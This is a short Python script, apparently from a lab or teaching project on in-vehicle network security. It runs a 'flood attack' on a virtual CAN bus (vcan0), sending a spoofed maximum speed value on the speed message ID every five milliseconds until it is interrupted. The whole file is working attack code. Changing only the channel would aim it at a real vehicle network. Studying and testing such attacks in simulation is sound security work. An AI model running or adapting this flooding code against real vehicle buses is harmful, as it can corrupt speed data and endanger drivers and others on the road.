import can
import time

# Import global variables from config file
from src.core.config import CAN_ID_SPEED

# Connect to virtual CAN network
bus = can.interface.Bus(channel = 'vcan0', interface = 'socketcan')

print("Flood attack initiated... Press Ctrl+C to stop.")

try:
    while True:
        # Send false data 
        msg = can.Message(
            arbitration_id = CAN_ID_SPEED,
            data = [255],
            is_extended_id = False
        )
        bus.send(msg)
        time.sleep(0.005)

# If interupt sent stop sneding messages and print
except KeyboardInterrupt:
    print("\nFlood attack stopped.")